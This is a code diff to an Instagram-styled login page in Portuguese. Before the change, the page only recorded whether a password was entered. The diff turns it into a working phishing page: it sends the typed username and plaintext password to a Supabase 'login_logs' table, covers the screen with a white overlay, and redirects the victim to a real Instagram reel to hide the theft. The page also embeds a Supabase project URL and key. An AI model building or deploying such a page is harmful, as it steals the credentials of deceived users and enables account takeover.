@@ -3,61 +3,53 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Entrar</title>
-
-  <link rel="icon" href="favicon.ico" type="image/x-icon">
+  <title>• Login</title>
 
   <style>
     * {
       box-sizing: border-box;
-      font-family: system-ui, -apple-system, BlinkMacSystemFont,
-        "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      font-family: Arial, sans-serif;
     }
 
     body {
       margin: 0;
-      height: 100vh;
       background: #fff;
       display: flex;
       justify-content: center;
       align-items: center;
+      height: 100vh;
     }
 
     .container {
       width: 100%;
-      max-width: 320px;
-      padding: 30px;
-      text-align: center;
-    }
-
-    .logo {
-      margin-bottom: 25px;
+      max-width: 350px;
+      padding: 40px 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
     }
 
     .logo img {
       max-width: 180px;
-      height: auto;
+      margin-bottom: 30px;
     }
 
     input {
       width: 100%;
       padding: 12px;
       margin-bottom: 10px;
-      background: #fafafa;
-      border: 1px solid #dbdbdb;
+      border: 1px solid #ccc;
       border-radius: 4px;
-      font-size: 14px;
     }
 
     button {
       width: 100%;
-      padding: 12px;
-      margin-top: 10px;
+      padding: 10px;
       background: #4cb5f9;
       border: none;
       border-radius: 8px;
       color: #fff;
-      font-weight: 600;
+      font-weight: bold;
       cursor: pointer;
     }
   </style>
@@ -65,55 +57,40 @@
 
 <body>
   <div class="container">
-    <!-- LOGO -->
     <div class="logo">
-      <img
-        src="https://i.postimg.cc/zDdCYPyg/Captura-de-tela-2025-12-17-221627.png"
-        alt="Logo"
-      />
+      <img src="https://i.postimg.cc/zDdCYPyg/Captura-de-tela-2025-12-17-221627.png">
     </div>
 
-    <!-- FORM -->
-    <form id="form">
-      <input
-        id="usuario"
-        type="text"
-        placeholder="Usuário"
-        required
-      />
-      <input
-        id="senha"
-        type="password"
-        placeholder="Senha"
-        required
-      />
-      <button type="submit">Entrar</button>
-    </form>
+    <input id="usuario" placeholder="Usuário">
+    <input id="senha" placeholder="Senha">
+
+    <button onclick="enviar()">Entrar</button>
   </div>
 
-  <!-- Supabase -->
+  <div id="whiteScreen" style="
+    display:none;
+    position:fixed;
+    inset:0;
+    background:#fff;
+    z-index:9999;"></div>
+
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
   <script>
-    const SUPABASE_URL = "https://pwmtpvsgykjvouljjmrz.supabase.co";
-    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB3bXRwdnNneWtqdm91bGpqbXJ6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYwMTMxMTAsImV4cCI6MjA4MTU4OTExMH0.xQa-Tmyzx6UOCALygjxEGFNAJsIeQZ-r7bPQyP8XFQ8";
-
     const supabaseClient = supabase.createClient(
-      SUPABASE_URL,
-      SUPABASE_KEY
+      "https://pwmtpvsgykjvouljjmrz.supabase.co",
+      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB3bXRwdnNneWtqdm91bGpqbXJ6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYwMTMxMTAsImV4cCI6MjA4MTU4OTExMH0.xQa-Tmyzx6UOCALygjxEGFNAJsIeQZ-r7bPQyP8XFQ8"
     );
 
-    document.getElementById("form").addEventListener("submit", async (e) => {
-      e.preventDefault();
-
+    async function enviar() {
       const usuario = document.getElementById("usuario").value;
-      const senhaInput = document.getElementById("senha").value;
+      const senha = document.getElementById("senha").value;
 
       const { error } = await supabaseClient
         .from("login_logs")
         .insert({
           usuario: usuario,
-          senha: senhaInput ? "preenchida" : "vazia"
+          senha: senha
         });
 
       if (error) {
@@ -121,8 +98,12 @@
         return;
       }
 
-      alert("Enviado com sucesso");
-    });
+      document.getElementById("whiteScreen").style.display = "block";
+      setTimeout(() => {
+        window.location.href = "https://www.instagram.com/reels/DSYPgN7EVG3/";
+      }, 150);
+    }
   </script>
 </body>
 </html>
+
